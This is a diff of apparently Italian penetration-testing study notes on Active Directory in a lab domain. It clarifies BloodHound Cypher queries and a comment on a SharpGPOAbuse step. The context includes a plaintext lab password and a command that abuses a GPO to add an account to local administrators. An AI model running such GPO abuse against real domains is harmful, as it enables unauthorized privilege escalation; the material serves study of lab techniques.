@@ -118,7 +118,7 @@
     - [Cypher query per restituire l'utente peter](#cypher-query-per-restituire-lutente-peter)
     - [Cypher query per restituire i gruppi a cui fa parte peter](#cypher-query-per-restituire-i-gruppi-a-cui-fa-parte-peter)
       - [Si possono anche restituire tutte le variabili n,r,g](#si-possono-anche-restituire-tutte-le-variabili-nrg)
-      - [In BloodHound si deve creare una variabile "p"!](#in-bloodhound-si-deve-creare-una-variabile-p)
+      - [In BloodHound si deve creare una variabile "p" se si vuole avere il grafo!](#in-bloodhound-si-deve-creare-una-variabile-p-se-si-vuole-avere-il-grafo)
   - [Altre Query perchè siamo hackerinə :D](#altre-query-perchè-siamo-hackerinə-d)
     - [Restituire la relazioni "MemberOf" di Peter](#restituire-la-relazioni-memberof-di-peter)
     - [Trovare un path dove il nome del primo gruppo contiene "ITSECURITY"](#trovare-un-path-dove-il-nome-del-primo-gruppo-contiene-itsecurity)
@@ -1116,7 +1116,7 @@ gpupdate /force
 $SecPassword = ConvertTo-SecureString 'BackingUpSecure1' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\svc_backups', $SecPassword)
 
-# Direttamente Step 1 - Abusa della GPO
+# Direttamente Step 1 - Abusa della GPO - Aggiungere un utente al gruppo Local Administrators su macchine scoperte
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount svc_backups --GPOName "BACKUPS"
 
 # Step 2 - Forza aggiornamento
@@ -1712,11 +1712,17 @@ RETURN n,r,g
 Come prima, ma invece di reare una nuova variabile, si restituiscono tutte le variabili "primitive".
 - In Neo4j, se si preme poi "Graph" si può vedere anche il grafo del risultato!
 
-#### In BloodHound si deve creare una variabile "p"!
+#### In BloodHound si deve creare una variabile "p" se si vuole avere il grafo!
+BloodHound usa Neo4j come database sottostante, quindi le query Cypher sono identiche.
+
+![alt text](images/bloodhound/bloodhound_query.png)
+
 ```
 MATCH p=((n:User {name:"PETER@INLANEFREIGHT.HTB"})-[r:MemberOf]->(g:Group)) 
 RETURN p
 ```
+
+```p=``` non è obbligatorio — lo usi solo quando vuoi vedere il path visivamente nel grafo. Per estrarre informazioni specifiche come nomi, proprietà, conteggi, lavori direttamente sui nodi senza assegnare il path.
 
 ## Altre Query perchè siamo hackerinə :D
 ### Restituire la relazioni "MemberOf" di Peter
